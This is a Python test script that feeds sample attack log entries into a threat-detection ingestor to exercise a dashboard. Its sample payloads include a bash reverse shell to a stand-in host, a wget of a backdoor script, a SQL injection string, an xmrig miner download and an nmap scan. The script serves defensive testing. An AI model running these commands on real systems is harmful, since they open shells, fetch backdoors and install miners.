import asyncio
import json
from src.ingestion.base_ingestor import BaseIngestor
from src.db import threat_db

async def generate_test_threats():
    """Generate test threat events for dashboard testing"""
    
    # Initialize database
    await threat_db.init_pool()
    
    # Create test ingestor
    config = {'batch_size': 5, 'queue_size': 100}
    ingestor = BaseIngestor("test_generator", config)
    await ingestor.start()
    
    # Test threat scenarios
    test_events = [
        # Critical threat from Russia
        {"ip": "91.109.190.234", "payload": "bash -i >&/dev/tcp/malicious.ru/4444 0>&1", "country": "Russia"},
        
        # High threat from China  
        {"ip": "218.92.0.107", "payload": "wget http://malware-c2.cn/backdoor.sh && chmod +x backdoor.sh", "country": "China"},
        
        # SQL injection attempt
        {"ip": "203.0.113.45", "payload": "' UNION SELECT * FROM users WHERE 1=1--", "country": "Unknown"},
        
        # Cryptocurrency miner
        {"ip": "185.220.101.182", "payload": "curl -s -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz", "country": "Germany"},
        
        # Medium threat - port scanning
        {"ip": "45.33.32.156", "payload": "nmap -sS -O target.company.com", "country": "United States"}
    ]
    
    print("Generating test threat events...")
    
    for event_data in test_events:
        # Create JSON log entry
        log_entry = {
            "timestamp": "2024-01-15T10:30:00Z",
            "source_ip": event_data["ip"],
            "message": event_data["payload"],
            "user_agent": "curl/7.68.0",
            "endpoint": "/api/login"
        }
        
        # Process through your threat detection system
        json_data = json.dumps(log_entry).encode()
        events = await ingestor.parse_data(json_data)
        
        for event in events:
            print(f"Generated: {event.ip} - {event.severity} (Score: {event.score})")
    
    await ingestor.stop()
    print("Test data generation complete!")

if __name__ == "__main__":
    asyncio.run(generate_test_threats())
